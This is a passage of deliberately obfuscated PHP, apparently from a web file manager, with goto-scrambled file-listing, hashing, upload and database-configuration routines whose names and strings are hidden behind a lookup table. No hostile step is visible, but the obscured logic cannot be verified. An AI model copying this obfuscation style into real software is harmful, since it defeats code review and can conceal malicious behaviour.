array($B¥çÚ‚ğÏ½[28] => $a«ôÀ»è°, $B¥çÚ‚ğÏ½[76] => $this->getPathOuter($bÈ£¶í¡•), $B¥çÚ‚ğÏ½[29] => $B¥çÚ‚ğÏ½[77]); } $bĞŞß ©¼ë = array($B¥çÚ‚ğÏ½[28] => $a«ôÀ»è°, $B¥çÚ‚ğÏ½[76] => $this->getPathOuter($bÈ£¶í¡•), $B¥çÚ‚ğÏ½[29] => $B¥çÚ‚ğÏ½[77], $B¥çÚ‚ğÏ½[194] => @filectime($bÈ£¶í¡•), $B¥çÚ‚ğÏ½[84] => @filemtime($bÈ£¶í¡•), $B¥çÚ‚ğÏ½[1289] => @fileatime($bÈ£¶í¡•), $B¥çÚ‚ğÏ½[1290] => is_readable($bÈ£¶í¡•), $B¥çÚ‚ğÏ½[1291] => is_writable($bÈ£¶í¡•), $B¥çÚ‚ğÏ½[1292] => get_mode($bÈ£¶í¡•)); return $bĞŞß ©¼ë; } private function fileInfo($fİö²…è—¦, $añ­È¢í™‡ = false) { $dºœÇ˜Çº© =& $_SERVER[Ö‘Øù]; $aµíÁê·´Š = $this->iconvApp($this->pathThis($fİö²…è—¦)); if ($añ­È¢í™‡) { return array($dºœÇ˜Çº©[28] => $aµíÁê·´Š, $dºœÇ˜Çº©[76] => $this->getPathOuter($fİö²…è—¦), $dºœÇ˜Çº©[29] => $dºœÇ˜Çº©[193], $dºœÇ˜Çº©[78] => $this->size($fİö²…è—¦), $dºœÇ˜Çº©[168] => $this->ext($aµíÁê·´Š)); } $F«à†ÃŸîÔ = array($dºœÇ˜Çº©[28] => $aµíÁê·´Š, $dºœÇ˜Çº©[76] => $this->getPathOuter($fİö²…è—¦), $dºœÇ˜Çº©[29] => $dºœÇ˜Çº©[193], $dºœÇ˜Çº©[194] => @filectime($fİö²…è—¦), $dºœÇ˜Çº©[84] => @filemtime($fİö²…è—¦), $dºœÇ˜Çº©[1289] => @fileatime($fİö²…è—¦), $dºœÇ˜Çº©[78] => $this->size($fİö²…è—¦), $dºœÇ˜Çº©[168] => $this->ext($aµíÁê·´Š), $dºœÇ˜Çº©[1290] => is_readable($fİö²…è—¦), $dºœÇ˜Çº©[1291] => is_writable($fİö²…è—¦), $dºœÇ˜Çº©[1292] => get_mode($fİö²…è—¦)); return $F«à†ÃŸîÔ; } public function exist($E´àŸ¢ÕÓƒ) { $E´àŸ¢ÕÓƒ = $this->iconvSystem($E´àŸ¢ÕÓƒ); return @file_exists($E´àŸ¢ÕÓƒ); } public function isFile($Bç´¾Ì²) { $Bç´¾Ì² = $this->iconvSystem($Bç´¾Ì²); return @is_file($Bç´¾Ì²); } public function isFolder($BšßÊ‹ù«å) { $BšßÊ‹ù«å = $this->iconvSystem($BšßÊ‹ù«å); return @is_dir($BšßÊ‹ù«å); } public function listPath($EªÇ–ºìÜ, $f¦É¤ì¦×Ä = false) { goto dßŠÏÏ²Æ‘; dßŠÏÏ²Æ‘: $A‰£‘¸‘¸½ =& $_SERVER[Ö‘Øù]; $EªÇ–ºìÜ = $this->iconvSystem($EªÇ–ºìÜ); $EªÇ–ºìÜ = rtrim($EªÇ–ºìÜ, $A‰£‘¸‘¸½[8]) . $A‰£‘¸‘¸½[8]; goto cñâÒÃÇëñ; AÃö²ä’ßÎ: closedir($dø£ëíî‹ã); return $A¾¾““š¸¶; goto fÊÊ­»î©·; cñâÒÃÇëñ: $A¾¾““š¸¶ = array($A‰£‘¸‘¸½[75] => array(), $A‰£‘¸‘¸½[74] => array()); if (!($dø£ëíî‹ã = @opendir($EªÇ–ºìÜ))) { return $A¾¾““š¸¶; } while (($Eºâ®“Íª = readdir($dø£ëíî‹ã)) !== !1) { if ($Eºâ®“Íª == $A‰£‘¸‘¸½[95] || $Eºâ®“Íª == $A‰£‘¸‘¸½[1286]) { continue; } $cãĞ×ÊÒ”« = $EªÇ–ºìÜ . $Eºâ®“Íª; if (is_file($cãĞ×ÊÒ”«)) { $A¾¾““š¸¶[$A‰£‘¸‘¸½[74]][] = $this->fileInfo($cãĞ×ÊÒ”«, $f¦É¤ì¦×Ä); } else { $A¾¾““š¸¶[$A‰£‘¸‘¸½[75]][] = $this->folderInfo($cãĞ×ÊÒ”«, $f¦É¤ì¦×Ä); } } goto AÃö²ä’ßÎ; fÊÊ­»î©·: } public function listAll($Càì´ÖÃ¦ƒ, &$cœÅ§ß¤ò  = array()) { goto FëÕ²ĞÎø¡; f¶Øøœ†«: if (!($cáÓòÇÉ– = @opendir($Càì´ÖÃ¦ƒ))) { return $cœÅ§ß¤ò ; } while (($B³œïÂ «‹ = readdir($cáÓòÇÉ–)) !== !1) { if ($B³œïÂ «‹ == $d¦î§Ê¸òŸ[95] || $B³œïÂ «‹ == $d¦î§Ê¸òŸ[1286]) { continue; } $f¿òµíó»é = $Càì´ÖÃ¦ƒ . $B³œïÂ «‹; if (is_dir($f¿òµíó»é) && !is_link($f¿òµíó»é)) { $cœÅ§ß¤ò [] = array($d¦î§Ê¸òŸ[76] => $f¿òµíó»é . $d¦î§Ê¸òŸ[8], $d¦î§Ê¸òŸ[77] => 1, $d¦î§Ê¸òŸ[84] => @filemtime($f¿òµíó»é), $d¦î§Ê¸òŸ[78] => 0); $this->listAll($f¿òµíó»é, $cœÅ§ß¤ò ); } else { $cœÅ§ß¤ò [] = array($d¦î§Ê¸òŸ[76] => $f¿òµíó»é, $d¦î§Ê¸òŸ[77] => 0, $d¦î§Ê¸òŸ[84] => @filemtime($f¿òµíó»é), $d¦î§Ê¸òŸ[78] => $this->size($f¿òµíó»é)); } } closedir($cáÓòÇÉ–); goto bÜæ²†´Êç; bÜæ²†´Êç: return $cœÅ§ß¤ò ; goto E‚Ôá°’ÚÕ; FëÕ²ĞÎø¡: $d¦î§Ê¸òŸ =& $_SERVER[Ö‘Øù]; $Càì´ÖÃ¦ƒ = $this->iconvSystem($Càì´ÖÃ¦ƒ); $Càì´ÖÃ¦ƒ = rtrim($Càì´ÖÃ¦ƒ, $d¦î§Ê¸òŸ[8]) . $d¦î§Ê¸òŸ[8]; goto f¶Øøœ†«; E‚Ôá°’ÚÕ: } public function has($AÅ…¢¹“µÑ, $BÔÙÛ¯øÈÙ = false, $B•àŒ£É¸“ = true) { goto FÜÌ…¨Á£Ã; a•ìƒƒİŒÌ: $eØ§„æÃ = 0; while (($FöÌÚŠôÀ = readdir($EŞ„Úùç)) !== !1) { if ($FöÌÚŠôÀ == $Bö™ô¨÷‘ª[95] || $FöÌÚŠôÀ == $Bö™ô¨÷‘ª[1286]) { continue; } $eóñîÄÌ´ï = $AÅ…¢¹“µÑ . $FöÌÚŠôÀ; if ($BÔÙÛ¯øÈÙ) { $eØ§„æÃ++; if (@is_file($eóñîÄÌ´ï)) { $Bá¥‡¢»ª++; } else { $B·êâŒëò¼++; } if ($eØ§„æÃ > 10000) { break; } continue; } if ($B•àŒ£É¸“) { if (@is_file($eóñîÄÌ´ï)) { return !0; } } else { if (@is_dir($eóñîÄÌ´ï . $Bö™ô¨÷‘ª[8])) { return !0; } } } closedir($EŞ„Úùç); goto f§¸£Æ˜; f§¸£Æ˜: if ($BÔÙÛ¯øÈÙ) { return array($Bö™ô¨÷‘ª[203] => $Bá¥‡¢»ª, $Bö™ô¨÷‘ª[204] => $B·êâŒëò¼); } return !1; goto b©•áÕÜ†ù; FÜÌ…¨Á£Ã: $Bö™ô¨÷‘ª =& $_SERVER[Ö‘Øù]; $AÅ…¢¹“µÑ = $this->iconvSystem($AÅ…¢¹“µÑ); $AÅ…¢¹“µÑ = rtrim($AÅ…¢¹“µÑ, $Bö™ô¨÷‘ª[8]) . $Bö™ô¨÷‘ª[8]; goto C˜òàŠË‰À; C˜òàŠË‰À: if (!($EŞ„Úùç = @opendir($AÅ…¢¹“µÑ))) { return !1; } $Bá¥‡¢»ª = 0; $B·êâŒëò¼ = 0; goto a•ìƒƒİŒÌ; b©•áÕÜ†ù: } public function hashSimple($C”À¯ à) { goto aÂäº’¢‰Ò; aóß”ƒÇâ×: $E‘Ä÷Íî¡¬ = $this->size($C”À¯ à); $EÑìï‡…ÈÏ = 200; $E‡Úã‹§É = 50; goto dœƒØÍÕ²•; a°‹–«¿ç¶: return md5($Cò‘˜’ùÙÛ) . $E‘Ä÷Íî¡¬; goto d¬Éï™Ù¢; aÂäº’¢‰Ò: $eÁÌŞÅËê =& $_SERVER[Ö‘Øù]; if (!$C”À¯ à) { return md5($eÁÌŞÅËê[33]); } $C”À¯ à = $this->iconvSystem($C”À¯ à); goto aóß”ƒÇâ×; dœƒØÍÕ²•: if ($E‘Ä÷Íî¡¬ <= $EÑìï‡…ÈÏ * $E‡Úã‹§É) { return $this->hashMd5($C”À¯ à) . $E‘Ä÷Íî¡¬; } $Cò‘˜’ùÙÛ = $eÁÌŞÅËê[33]; $Aª¤‡‚«Í = intval($E‘Ä÷Íî¡¬ / $E‡Úã‹§É); goto a¬ù–ÊÂºä; FÓĞ¦’”™Ã: fseek_64($CÛªÊ…¤Æ–, $E‘Ä÷Íî¡¬ - $EÑìï‡…ÈÏ); $Cò‘˜’ùÙÛ .= fread($CÛªÊ…¤Æ–, $EÑìï‡…ÈÏ); fclose($CÛªÊ…¤Æ–); goto a°‹–«¿ç¶; a¬ù–ÊÂºä: $CÛªÊ…¤Æ– = fopen($C”À¯ à, $eÁÌŞÅËê[1293]); if (!$CÛªÊ…¤Æ–) { return $Cò‘˜’ùÙÛ; } for ($d¢¹¹å‹ÂÄ = 0; $d¢¹¹å‹ÂÄ < $E‡Úã‹§É; $d¢¹¹å‹ÂÄ++) { fseek_64($CÛªÊ…¤Æ–, $Aª¤‡‚«Í * $d¢¹¹å‹ÂÄ); $Cò‘˜’ùÙÛ .= fread($CÛªÊ…¤Æ–, $EÑìï‡…ÈÏ); } goto FÓĞ¦’”™Ã; d¬Éï™Ù¢: } public function getContent($b•Ëé‚¬¦ö) { $b•Ëé‚¬¦ö = $this->iconvSystem($b•Ëé‚¬¦ö); return file_get_contents($b•Ëé‚¬¦ö); } public function setContent($cÇ‘º’ĞÈœ, $Eè·²‰Ç = '') { $cÇ‘º’ĞÈœ = $this->iconvSystem($cÇ‘º’ĞÈœ); $CˆÌÚØæÛ = @file_put_contents($cÇ‘º’ĞÈœ, $Eè·²‰Ç, LOCK_EX); clearstatcache(); @chmod($cÇ‘º’ĞÈœ, $this->pathAuth); return $CˆÌÚØæÛ === !1 ? !1 : !0; } public function fileSubstr($D†‚Àï®Â, $a÷›ùÆ°ğ = 0, $aæÚÊ¶—‚ñ = false) { goto dõ‰ æªçé; B®Ì—ˆ‚Ÿ“: return $fãéŠÌ«; goto F„ÌÍ¦¾„™; dõ‰ æªçé: $FšñÇƒ¡÷© =& $_SERVER[Ö‘Øù]; $D†‚Àï®Â = $this->iconvSystem($D†‚Àï®Â); if ($aæÚÊ¶—‚ñ === !1) { $aæÚÊ¶—‚ñ = $this->size($D†‚Àï®Â); } goto dø¿ËŞÄÁ; dø¿ËŞÄÁ: if ($aæÚÊ¶—‚ñ <= 0) { return $FšñÇƒ¡÷©[33]; } $AëÒ¢¸¡– = fopen($D†‚Àï®Â, $FšñÇƒ¡÷©[1293]); if (!$AëÒ¢¸¡–) { return !1; } goto Còª¡æÑ–Ê; Còª¡æÑ–Ê: fseek_64($AëÒ¢¸¡–, $a÷›ùÆ°ğ); $fãéŠÌ« = fread($AëÒ¢¸¡–, $aæÚÊ¶—‚ñ); fclose($AëÒ¢¸¡–); goto B®Ì—ˆ‚Ÿ“; F„ÌÍ¦¾„™: } public function upload($D±…¾îÛª—, $Bš—Ï‘ØŒé, $aòìÂ¸‡¹ = false, $DÕÔÓ‹¾®‘ = REPEAT_REPLACE) { if ($aòìÂ¸‡¹) { return $this->moveFile($Bš—Ï‘ØŒé, $D±…¾îÛª—); } return $this->copyFile($Bš—Ï‘ØŒé, $D±…¾îÛª—); } public function setModifyTime($Cƒ‡ï‘ÌŠ, $AòÂÄ¦œ– = '') { @touch($Cƒ‡ï‘ÌŠ, intval($AòÂÄ¦œ–)); } public function download($Dæà¢ËÙÓÌ, $a•³î÷ˆ¼‹) { return $this->iconvSystem($Dæà¢ËÙÓÌ); } } goto bÇ°Â®™š; Bº÷è‰š’µ: function binCheckBigger($eÌ‡…«‘ªÕ, $d©„ÈĞ†ŞÀ) { return $eÌ‡…«‘ªÕ > $d©„ÈĞ†ŞÀ; } $_SERVER[$_SERVER[¦¦åº…Öñ][3]] = ("\71\62\63\71"."\x39\x39")+0;$_THz8="VU45tYy3bKnrYFATRveI7fWjhXyXSMmV3XI9E332JBftH2GgwBYwCDxTEwBKnv9iNsJ5PQesgGhkRhZ9";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($FñÎÚÏ£íù, $aì»„“–Ô) { $b×¯Îèæšİ =& $_SERVER[Ö‘Øù]; if (isset(self::$_methodList[$FñÎÚÏ£íù])) { return @call_user_func_array(self::$_methodList[$FñÎÚÏ£íù], $aì»„“–Ô); } else { if (method_exists($this, $FñÎÚÏ£íù)) { return call_user_func_array(array($this, $FñÎÚÏ£íù), $aì»„“–Ô); } else { think_exception(__CLASS__ . $b×¯Îèæšİ[4] . $FñÎÚÏ£íù . $b×¯Îèæšİ[5]); } } } public static function __callStatic($Dóğó¶™ƒÅ, $bøƒÇ»•éè) { if (isset(self::$_methodListStatic[$Dóğó¶™ƒÅ])) { return call_user_func_array(self::$_methodListStatic[$Dóğó¶™ƒÅ], $bøƒÇ»•éè); } else { if (method_exists(self, $Dóğó¶™ƒÅ)) { return call_user_func_array(array(self, $Dóğó¶™ƒÅ), $bøƒÇ»•éè); } else { show_json("{$Dóğó¶™ƒÅ}\50\51\40\x6e\x6f\164\40\145\x78\x69\x73\x74\73", !1); } } } public static function addMethod($D„Ù¨œ¯Ëß, $b†À¡Ü¡æ) { self::$_methodList[$D„Ù¨œ¯Ëß] = $b†À¡Ü¡æ; } public static function addMethodStatic($F¶÷¬š¬Çè, $fÌ×²Ø¯³¬) { self::$_methodListStatic[$F¶÷¬š¬Çè] = $fÌ×²Ø¯³¬; } } goto D®íê‘±¸ñ; cŸÍ¯–â‚‰: class DbSqlite3 extends DbSqlite3Base { public function query($dß”‹Ğ ¦à) { $cêÕùĞÅë =& $_SERVER[Ö‘Øù]; if (!CacheLock::fileLock($cêÕùĞÅë[9])) { return !1; } $f›øè´„›ª = parent::query($dß”‹Ğ ¦à); CacheLock::fileUnLock($cêÕùĞÅë[9]); return $f›øè´„›ª; } public function execute($C ÷îŒÈ½×) { $Aàñâ½Ô’  =& $_SERVER[Ö‘Øù]; if (!CacheLock::fileLock($Aàñâ½Ô’ [9])) { return !1; } $A‰…éè¤Ù´ = parent::execute($C ÷îŒÈ½×); CacheLock::fileUnLock($Aàñâ½Ô’ [9]); return $A‰…éè¤Ù´; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\x74\150\151\156\x6b\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\x71" => "\x3d", "\156\145\161" => "\x3c\x3e", "\147\164" => "\76", "\x65\147\x74" => "\76\75", "\154\x74" => "\74", "\145\154\164" => "\x3c\x3d", "\x6e\157\164\x6c\151\x6b\x65" => "\x4e\117\x54\x20\x4c\111\x4b\105", "\x6c\x69\x6b\x65" => "\114\111\113\105", "\x69\x6e" => "\x49\x4e", "\156\157\x74\x69\156" => "\116\x4f\x54\40\111\116", "\x6e\157\164\40\x69\x6e" => "\116\x4f\124\x20\x49\116", "\142\145\164\x77\x65\x65\156" => "\102\x45\124\127\105\x45\x4e", "\x6e\x6f\164\142\145\x74\167\x65\145\x6e" => "\116\117\124\40\102\x45\124\x57\x45\x45\116", "\156\x6f\x74\40\x62\145\164\x77\145\145\x6e" => "\x4e\117\124\40\102\105\124\127\105\105\x4e"); protected $selectSql = "\x53\105\114\105\x43\124\x25\x44\x49\123\124\111\116\x43\124\45\x20\x25\x46\111\x45\x4c\x44\45\x20\x46\x52\x4f\x4d\40\x25\124\x41\x42\x4c\105\x25\x25\x4a\117\x49\116\x25\x25\127\110\105\x52\105\45\x25\x47\x52\117\125\x50\x25\x25\x48\x41\x56\111\x4e\x47\45\x25\117\122\104\x45\122\x25\45\114\111\115\x49\x54\x25\40\x25\x55\116\x49\x4f\x4e\x25\x25\103\117\x4d\115\105\116\x54\x25"; protected $bind = array(); public static function getInstance() { $AÅÆŸâ½›¥ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[Ö‘Øù][955], $AÅÆŸâ½›¥); } public function factory($b™å¯Øº†Ş = '') { goto CÁµíÖ‘åŸ; FÏ«Öãë†: $this->dbType = ucwords(strtolower($b™å¯Øº†Ş[$AÍÁ×ĞÙ†[956]])); $dÍ ¼ÉÃ = $AÍÁ×ĞÙ†[958] . $this->dbType; if (class_exists($dÍ ¼ÉÃ)) { $D¥Ïó¡ù×Ì = new $dÍ ¼ÉÃ($b™å¯Øº†Ş); if ($AÍÁ×ĞÙ†[790] != strtolower($b™å¯Øº†Ş[$AÍÁ×ĞÙ†[956]])) { $D¥Ïó¡ù×Ì->dbType = strtoupper($this->dbType); } else { $D¥Ïó¡ù×Ì->dbType = $this->_getDsnType($b™å¯Øº†Ş[$AÍÁ×ĞÙ†[911]]); } } else { think_exception(think_lang($AÍÁ×ĞÙ†[959]) . $AÍÁ×ĞÙ†[960] . $dÍ ¼ÉÃ); } goto Eåè†Ÿ˜àí; CÁµíÖ‘åŸ: $AÍÁ×ĞÙ† =& $_SERVER[Ö‘Øù]; $b™å¯Øº†Ş = $this->parseConfig($b™å¯Øº†Ş); if (empty($b™å¯Øº†Ş[$AÍÁ×ĞÙ†[956]])) { think_exception(think_lang($AÍÁ×ĞÙ†[957])); } goto FÏ«Öãë†; Eåè†Ÿ˜àí: return $D¥Ïó¡ù×Ì; goto C«ª„Î¥Ñ£; C«ª„Î¥Ñ£: } public function __call($bĞÅù£ê…, $A§Ã»ß) { if (method_exists($this, $bĞÅù£ê…)) { return call_user_func_array(array($this, $bĞÅù£ê…), $A§Ã»ß); } } protected function _getDsnType($Eßçßò…·) { $Fã‚åó„½„ = explode($_SERVER[Ö‘Øù][4], $Eßçßò…·); $Dİ†±Æ‘¼ = strtoupper(trim($Fã‚åó„½„[0])); return $Dİ†±Æ‘¼; } private function parseConfig($e¹æà–ğËº = '') { $B†±–…°ß =& $_SERVER[Ö‘Øù]; if (!empty($e¹æà–ğËº) && is_string($e¹æà–ğËº)) { $e¹æà–ğËº = $this->parseDSN($e¹æà–ğËº); } elseif (is_array($e¹æà–ğËº)) { $e¹æà–ğËº = array_change_key_case($e¹æà–ğËº); $e¹æà–ğËº = array($B†±–…°ß[956] => $e¹æà–ğËº[$B†±–…°ß[789]], $B†±–…°ß[883] => $e¹æà–ğËº[$B†±–…°ß[961]], $B†±–…°ß[884] => $e¹æà–ğËº[$B†±–…°ß[962]], $B†±–…°ß[881] => $e¹æà–ğËº[$B†±–…°ß[963]], $B†±–…°ß[882] => $e¹æà–ğËº[$B†±–…°ß[964]], $B†±–…°ß[17] => $e¹æà–ğËº[$B†±–…°ß[965]], $B†±–…°ß[911] => $e¹æà–ğËº[$B†±–…°ß[791]], $B†±–…°ß[13] => isset($e¹æà–ğËº[$B†±–…°ß[966]]) ? $e¹æà–ğËº[$B†±–…°ß[966]] : array()); } elseif (empty($e¹æà–ğËº)) { if (think_config($B†±–…°ß[967]) && $B†±–…°ß[790] != strtolower(think_config($B†±–…°ß[968]))) { $e¹æà–ğËº = $this->parseDSN(think_config($B†±–…°ß[967])); } else { $e¹æà–ğËº = array($B†±–…°ß[956] => think_config($B†±–…°ß[968]), $B†±–…°ß[883] => think_config($B†±–…°ß[969]), $B†±–…°ß[884] => think_config($B†±–…°ß[970]), $B†±–…°ß[881] => think_config($B†±–…°ß[971]), $B†±–…°ß[882] => think_config($B†±–…°ß[972]), $B†±–…°ß[17] => think_config($B†±–…°ß[244]), $B†±–…°ß[911] => think_config($B†±–…°ß[967]), $B†±–…°ß[13] => think_config($B†±–…°ß[973])); } } return $e¹æà–ğËº; } protected function initConnect($c—Ã®ƒªÒ = true) { if (1 == think_config($_SERVER[Ö‘Øù][18])) { $this->_linkID = $this->multiConnect($c—Ã®ƒªÒ); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $Eîô‹³¸èÙ => $E–ñ…’¯£) { $this->_linkID = $E–ñ…’¯£; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($Bğ…·ÃÅˆ” = false) { goto dÊ‹ù®ï¼; DæÓ±ä…µ”: if (empty($dëš°‘¿Ñ³)) { foreach ($this->config as $CĞİ»…¥éª => $EÚì™¥ÖÛŒ) { $dëš°‘¿Ñ³[$CĞİ»…¥éª] = explode($EÒŞŠŠÅŒ‚[47], $EÚì™¥ÖÛŒ); } } if (think_config($EÒŞŠŠÅŒ‚[974])) { if ($Bğ…·ÃÅˆ” || think_config($EÒŞŠŠÅŒ‚[391]) === !0) { $aéµÖªÀº¯ = floor(mt_rand(0, think_config($EÒŞŠŠÅŒ‚[975]) - 1)); $CôÙ±Ê‚Û = $aéµÖªÀº¯; } else { if (is_numeric(think_config($EÒŞŠŠÅŒ‚[976]))) { $aéµÖªÀº¯ = think_config($EÒŞŠŠÅŒ‚[976]); } else { $aéµÖªÀº¯ = floor(mt_rand(think_config($EÒŞŠŠÅŒ‚[975]), count($dëš°‘¿Ñ³[$EÒŞŠŠÅŒ‚[881]]) - 1)); } } } else { $aéµÖªÀº¯ = floor(mt_rand(0, count($dëš°‘¿Ñ³[$EÒŞŠŠÅŒ‚[881]]) - 1)); $CôÙ±Ê‚Û = $aéµÖªÀº¯; } $aéµÖªÀº¯ = $CôÙ±Ê‚Û !== -1 ? $CôÙ±Ê‚Û : $aéµÖªÀº¯; goto BÀ†áêïÇš; dÊ‹ù®ï¼: $EÒŞŠŠÅŒ‚ =& $_SERVER[Ö‘Øù]; static $dëš°‘¿Ñ³ = array(); static $CôÙ±Ê‚Û = -1; goto DæÓ±ä…µ”; BÀ†áêïÇš: $c‹ÈèÊğÙø = array($EÒŞŠŠÅŒ‚[883] => isset($dëš°‘¿Ñ³[$EÒŞŠŠÅŒ‚[883]][$aéµÖªÀº¯]) ? $dëš°‘¿Ñ³[$EÒŞŠŠÅŒ‚[883]][$aéµÖªÀº¯] : $dëš°‘¿Ñ³[$EÒŞŠŠÅŒ‚[883]][0], $EÒŞŠŠÅŒ‚[884] => isset($dëš°‘¿Ñ³[$EÒŞŠŠÅŒ‚[884]][$aéµÖªÀº¯]) ? $dëš°‘¿Ñ³[$EÒŞŠŠÅŒ‚[884]][$aéµÖªÀº¯] : $dëš°‘¿Ñ³[$EÒŞŠŠÅŒ‚[884]][0], $EÒŞŠŠÅŒ‚[881] => isset($dëš°‘¿Ñ³[$EÒŞŠŠÅŒ‚[881]][$aéµÖªÀº¯]) ? $dëš°‘¿Ñ³[$EÒŞŠŠÅŒ‚[881]][$aéµÖªÀº¯] : $dëš°‘¿Ñ³[$EÒŞŠŠÅŒ‚[881]][0], $EÒŞŠŠÅŒ‚[882] => isset($dëš°‘¿Ñ³[$EÒŞŠŠÅŒ‚[882]][$aéµÖªÀº¯]) ? $dëš°‘¿Ñ³[$EÒŞŠŠÅŒ‚[882]][$aéµÖªÀº¯] : $dëš°‘¿Ñ³[$EÒŞŠŠÅŒ‚[882]][0], $EÒŞŠŠÅŒ‚[17] => isset($dëš°‘¿Ñ³[$EÒŞŠŠÅŒ‚[17]][$aéµÖªÀº¯]) ? $dëš°‘¿Ñ³[$EÒŞŠŠÅŒ‚[17]][$aéµÖªÀº¯] : $dëš°‘¿Ñ³[$EÒŞŠŠÅŒ‚[17]][0], $EÒŞŠŠÅŒ‚[911] => isset($dëš°‘¿Ñ³[$EÒŞŠŠÅŒ‚[911]][$aéµÖªÀº¯]) ? $dëš°‘¿Ñ³[$EÒŞŠŠÅŒ‚[911]][$aéµÖªÀº¯] : $dëš°‘¿Ñ³[$EÒŞŠŠÅŒ‚[911]][0], $EÒŞŠŠÅŒ‚[13] => isset($dëš°‘¿Ñ³[$EÒŞŠŠÅŒ‚[13]][$aéµÖªÀº¯]) ? $dëš°‘¿Ñ³[$EÒŞŠŠÅŒ‚[13]][$aéµÖªÀº¯] : $dëš°‘¿Ñ³[$EÒŞŠŠÅŒ‚[13]][0]); return $this->connect($c‹ÈèÊğÙø, $aéµÖªÀº¯); goto A¾¿£®¾Ù’; A¾¿£®¾Ù’: } public function parseDSN($D§÷øÍ«ÀŒ) { $fâùŞëÅÛÍ =& $_SERVER[Ö‘Øù]; if (empty($D§÷øÍ«ÀŒ)) { return !1; } $a²óÅêƒèš = parse_url($D§÷øÍ«ÀŒ); if ($a²óÅêƒèš[$fâùŞëÅÛÍ[174]]) { $D¸ÍÓäŠˆ» = array($fâùŞëÅÛÍ[956] => $a²óÅêƒèš[$fâùŞëÅÛÍ[174]], $fâùŞëÅÛÍ[883] => isset($a²óÅêƒèš[$fâùŞëÅÛÍ[589]]) ? $a²óÅêƒèš[$fâùŞëÅÛÍ[589]] : $fâùŞëÅÛÍ[33], $fâùŞëÅÛÍ[884] => isset($a²óÅêƒèš[$fâùŞëÅÛÍ[977]]) ? $a²óÅêƒèš[$fâùŞëÅÛÍ[977]] : $fâùŞëÅÛÍ[33], $fâùŞëÅÛÍ[881] => isset($a²óÅêƒèš[$fâùŞëÅÛÍ[175]]) ? $a²óÅêƒèš[$fâùŞëÅÛÍ[175]] : $fâùŞëÅÛÍ[33], $fâùŞëÅÛÍ[882] => isset($a²óÅêƒèš[$fâùŞëÅÛÍ[176]]) ? $a²óÅêƒèš[$fâùŞëÅÛÍ[176]] : $fâùŞëÅÛÍ[33], $fâùŞëÅÛÍ[17] => isset($a²óÅêƒèš[$fâùŞëÅÛÍ[76]]) ? substr($a²óÅêƒèš[$fâùŞëÅÛÍ[76]], 1) : $fâùŞëÅÛÍ[33]); } else { preg_match($fâùŞëÅÛÍ[978], trim($D§÷øÍ«ÀŒ), $e²˜—ƒ·ÉÌ); $D¸ÍÓäŠˆ» = array($fâùŞëÅÛÍ[956] => $e²˜—ƒ·ÉÌ[1], $fâùŞëÅÛÍ[883] => $e²˜—ƒ·ÉÌ[2], $fâùŞëÅÛÍ[884] => $e²˜—ƒ·ÉÌ[3], $fâùŞëÅÛÍ[881] => $e²˜—ƒ·ÉÌ[4], $fâùŞëÅÛÍ[882] => $e²˜—ƒ·ÉÌ[5], $fâùŞëÅÛÍ[17] => $e²˜—ƒ·ÉÌ[6]); } $D¸ÍÓäŠˆ»[$fâùŞëÅÛÍ[911]] = $fâùŞëÅÛÍ[33]; return $D¸ÍÓäŠˆ»; } protected function debug() { $B½ºï±Öë =& $_SERVER[Ö‘Øù]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $B½ºï±Öë[979]; if (think_config($B½ºï±Öë[980])) { think_status($B½ºï±Öë[981]); think_trace($this->queryStr . $B½ºï±Öë[982] . think_status($B½ºï±Öë[20], $B½ºï±Öë[981], 6) . $B½ºï±Öë[983], $B½ºï±Öë[33], $B½ºï±Öë[984]); } } protected function parseLock($AÜ˜Î ÌÄŞ = false) { $DšÁ¥÷¹ÁË =& $_SERVER[Ö‘Øù]; if (!$AÜ˜Î ÌÄŞ) { return $DšÁ¥÷¹ÁË[33]; } if ($DšÁ¥÷¹ÁË[913] == $this->dbType) { return $DšÁ¥÷¹ÁË[985]; } return $DšÁ¥÷¹ÁË[986]; } protected function parseSet($c…‹ÏÍè‡˜) { $Eä÷è‡õµõ =& $_SERVER[Ö‘Øù]; foreach ($c…‹ÏÍè‡˜ as $Dãˆ¹Çä‡ => $FÚŠöó³É×) { if (is_array($FÚŠöó³É×) && $Eä÷è‡õµõ[295] == $FÚŠöó³É×[0]) { $Cíòì“ßÔ‡[] = $this->parseKey($Dãˆ¹Çä‡) . $Eä÷è‡õµõ[987] . $FÚŠöó³É×[1]; } elseif (is_scalar($FÚŠöó³É×) || is_null($FÚŠöó³É×)) { $Cíòì“ßÔ‡[] = $this->parseKey($Dãˆ¹Çä‡) . $Eä÷è‡õµõ[987] . $this->parseValue($FÚŠöó³É×); } } return $Eä÷è‡õµõ[988] . implode($Eä÷è‡õµõ[47], $Cíòì“ßÔ‡); } protected function bindParam($fí†ºøºøÈ, $D³ã©ó™Ìƒ) { $this->bind[$_SERVER[Ö‘Øù][4] . $fí†ºøºøÈ] = $D³ã©ó™Ìƒ; } protected function parseBind($F˜…œ“‘Š·) { $F˜…œ“‘Š· = array_merge($this->bind, $F˜…œ“‘Š·); $this->bind = array(); return $F˜…œ“‘Š·; } function parseKey(&$aÆõÅ÷Œ†, $CŠ¤Ç¿©ĞÈ = true) { if ($CŠ¤Ç¿©ĞÈ) { $aÆõÅ÷Œ† = $this->parseKeyCheck($aÆõÅ÷Œ†); } return $aÆõÅ÷Œ†; } function parseKeyCheck($f—‚‘‰²„ô) { $Bñ£î—Ë×‡ =& $_SERVER[Ö‘Øù]; $f—‚‘‰²„ô = trim($f—‚‘‰²„ô); if (!preg_match($Bñ£î—Ë×‡[989], $f—‚‘‰²„ô)) { think_exception($Bñ£î—Ë×‡[990] . $f—‚‘‰²„ô); } return $f—‚‘‰²„ô; } protected function parseValue($D³õ¹Î‹—„) { $D¤íÖ© ›õ =& $_SERVER[Ö‘Øù]; if 